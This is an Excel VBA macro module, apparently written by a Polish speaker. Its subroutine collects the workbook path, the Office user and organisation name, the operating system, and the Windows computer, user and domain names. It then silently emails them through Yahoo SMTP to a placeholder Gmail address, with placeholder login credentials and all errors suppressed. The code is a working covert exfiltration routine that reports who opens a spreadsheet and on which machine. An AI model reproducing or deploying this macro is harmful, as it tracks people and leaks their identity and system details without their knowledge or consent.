Attribute VB_Name = "Module1"
Sub pocztylion()
    On Error Resume Next
        czas = "<b>" & FormatDateTime(Now(), 4) & "</b> - " & FormatDateTime(Now(), 1)
        plik = "<nobr><big><b>" & ThisWorkbook.Name & "</b></big></nobr><br>" & czas
        program = "<small>" & Replace(Application.Name, " ", "<br>") & "</small>"
        guzik = "<button type='reset' title=" & Application.Version & ">" & program & "</button>"
    razem = "<tr><td align='right'>" & plik & "</td><td align='center'>" & guzik & "</td></tr>"
        nazwa = "<small> " & ThisWorkbook.FullName & " </small>"
        miejsce = "<a href=" & ThisWorkbook.FullNameURLEncoded & ">" & nazwa & "</a>"
        miejsce = "<fieldset><legend><i>Lokalizacja pliku</i></legend>" & miejsce & "</fieldset>"
    razem = razem & "<tr><td colspan='2'>" & miejsce & "</td></tr>"
        osoba = "<b>" & Application.UserName & " </b>" & Application.OrganizationName
        system = "<small> " & Replace(Application.OperatingSystem, " ", "<br>") & "</small>"
    razem = razem & "<tr><td>" & osoba & "</td><td rowspan='2' align='center'>" & system & "</tr>"
        zmienna = UCase(Environ("COMPUTERNAME") & " - " & Environ("USERNAME"))
        If Environ("COMPUTERNAME") <> Environ("USERDOMAIN") Then
           zmienna = zmienna & " - " & UCase(Environ("USERDOMAIN"))
        End If
    razem = razem & "<tr><td align='center'>" & zmienna & "</td></tr>"
   
    Dim pocztaCDO: Set pocztaCDO = CreateObject("CDO.Message")
    Dim komuCDO: Set komuCDO = CreateObject("CDO.Configuration")
    komuCDO.Load -1
    szyfrogram = "xxxxxxx16xxxxxxx"
    nadawca = "xxxxFROMxxxx@yahoo.com"
    Dim serwerCDO: Set serwerCDO = komuCDO.Fields
    schematMS = "http://schemas.microsoft.com/cdo/configuration/"
    With serwerCDO
        .Item(schematMS & "smtpusessl") = True
        .Item(schematMS & "smtpauthenticate") = 1
        .Item(schematMS & "sendusername") = nadawca
        .Item(schematMS & "sendpassword") = szyfrogram
        .Item(schematMS & "smtpserver") = "smtp.mail.yahoo.com"
        .Item(schematMS & "sendusing") = 2
        .Item(schematMS & "smtpserverport") = 465
        .Item(schematMS & "smtpconnectiontimeout") = 30
        .Update
    End With
    With pocztaCDO
    Set .Configuration = komuCDO
        .BodyPart.Charset = "utf-8"
        .To = "xxxxxTOxxxxx+xls@gmail.com"
        .CC = "": .BCC = ""
        .FROM = nadawca
        .Subject = "MS" & Chr(133) & "Excel(vba)"
        .HTMLBody = "<html><body><table border='0'>" & razem & "</table></body></html>"
        .Send
    End With
    Set pocztaCDO = Nothing: Set serwerCDO = Nothing: Set komuCDO = Nothing
End Sub
